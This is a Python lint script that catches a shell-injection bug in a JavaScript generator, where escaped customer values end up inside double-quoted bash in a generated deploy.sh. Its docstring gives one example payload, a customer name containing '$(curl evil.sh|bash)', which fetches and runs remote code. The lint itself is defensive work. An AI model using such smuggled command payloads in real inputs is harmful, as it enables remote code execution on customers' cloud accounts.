#!/usr/bin/env python3
"""
lint_shell_injection.py — block a specific class of generator-side shell
injection bug from reaching prod.

Context: `configurator.html` builds a bash script at runtime via a JS
template literal and offers it to the customer as `deploy.sh`. A naive
author escapes user-controlled input with `.replace(/'/g, "'\\''")` and
then emits the value inside DOUBLE quotes. In double-quoted bash,
`$(...)`, backticks, `\`, and `$VAR` all still expand — the escape is
irrelevant and a partner-supplied "customer name" like
`Acme $(curl evil.sh|bash) Corp` becomes RCE on the customer's
CloudShell with AdministratorAccess. That's U4 in the remediation plan.

The only correct shape here is SINGLE-quoted containment where the
`'\''` escape closes the span, inserts a literal quote, and reopens.
This lint enforces that shape.

Rule: any line in configurator.html that contains BOTH
  (a) the single-quote `.replace(/'/g, "'\\''")` escape pattern, AND
  (b) a helper variable that is subsequently emitted inside DOUBLE quotes
must fail. Equivalently: variables produced by the single-quote escape
must only be emitted inside single quotes (or bare — when the helper
already wraps in single quotes itself).

Heuristic shape of the negative pattern, line-by-line:
    const X = <something>.replace(/'/g, "'\\''");
    ...
    ${X}  inside a line that starts with a shell-variable assignment
    "${X}"   <-- FAIL: double-quoted emit of single-quote-escaped value

A one-liner regex can't fully verify taint flow, but we can catch the
two known-bad shapes directly: (1) the bare `.replace(/'/g, "'\\''")`
pattern outside a containment helper that returns a single-quote-wrapped
string; (2) any occurrence of `"${<varname>}"` where `<varname>` was
declared via that escape. Keep the check narrow so it does not false-
positive across future generator work.
"""
from __future__ import annotations

import pathlib
import re
import sys

ROOT = pathlib.Path(__file__).resolve().parents[2]
HTML_FILE = ROOT / 'configurator.html'

SINGLE_QUOTE_ESCAPE = re.compile(
    r"""\.replace\(\s*/'/g\s*,\s*["']'\\\\''["']\s*\)"""
)
# A "safe" escape helper wraps its output in single quotes:
#   `'${ ... .replace(/'/g, "'\\''") }'`
# Detect by looking for the escape call inside a template literal that
# opens with `' and closes with '`.
SAFE_HELPER_LINE = re.compile(
    r"""`'\$\{.*\.replace\(\s*/'/g\s*,\s*["']'\\\\''["']\s*\).*\}'`"""
)
# Lines of the form `VAR="${customerSomething}"` where the double-quote
# wrapping is the bug (assumes the escape produced the value).
DOUBLE_QUOTED_CUSTOMER_EMIT = re.compile(
    r'^\s*[A-Z_][A-Z0-9_]*="\$\{(customer\w*)\}"\s*$'
)


def main() -> int:
    if not HTML_FILE.exists():
        print(f"lint_shell_injection: {HTML_FILE} not found", file=sys.stderr)
        return 1

    text = HTML_FILE.read_text()
    fails: list[str] = []

    # Check 1: every `.replace(/'/g, "'\\''")` use must be inside a
    # containment helper that wraps its output in single quotes.
    for m in SINGLE_QUOTE_ESCAPE.finditer(text):
        # Find the enclosing line.
        line_start = text.rfind('\n', 0, m.start()) + 1
        line_end = text.find('\n', m.end())
        line = text[line_start:line_end]
        lineno = text.count('\n', 0, m.start()) + 1
        # If the surrounding expression doesn't single-quote-wrap the
        # result (see SAFE_HELPER_LINE), flag it.
        if not SAFE_HELPER_LINE.search(line):
            # Also tolerate lines that immediately wrap in single quotes
            # via a later concatenation pattern like `"'" + escape + "'"`.
            if not re.search(r"""["']'["']\s*\+""", line) and not re.search(r"""\+\s*["']'["']""", line):
                fails.append(
                    f"configurator.html:{lineno}: `.replace(/'/g, \"'\\\\''\")` used without "
                    f"single-quoted containment. This escape is ONLY valid inside single-quoted "
                    f"shell output. Wrap the result in `'...'` or use a helper that does. See U4."
                )

    # Check 2: no `VAR="${customerX}"` emit pattern. Customer-derived values
    # must be emitted without surrounding double quotes — the helper itself
    # produces a properly single-quoted literal.
    for i, line in enumerate(text.splitlines(), start=1):
        m = DOUBLE_QUOTED_CUSTOMER_EMIT.match(line)
        if m:
            fails.append(
                f"configurator.html:{i}: {line.strip()!r} emits a customer-derived value inside "
                f"double quotes. In double-quoted bash, $(...), `...`, \\, and $VAR all still "
                f"expand — this is the U4 RCE shape. Drop the surrounding double quotes; the "
                f"shellSingleQuote helper already wraps its output in single quotes."
            )

    if fails:
        print("lint_shell_injection: FAILED")
        for f in fails:
            print(f"  ❌ {f}")
        print()
        print(
            "See U4 in auto-map-tagger-state.md for the attack scenario. "
            "The fix is shell-single-quote containment; never emit user-controlled "
            "values inside double-quoted shell strings."
        )
        return 1

    print("OK: no shell-injection shapes detected in configurator.html (U4 guard).")
    return 0


if __name__ == '__main__':
    sys.exit(main())
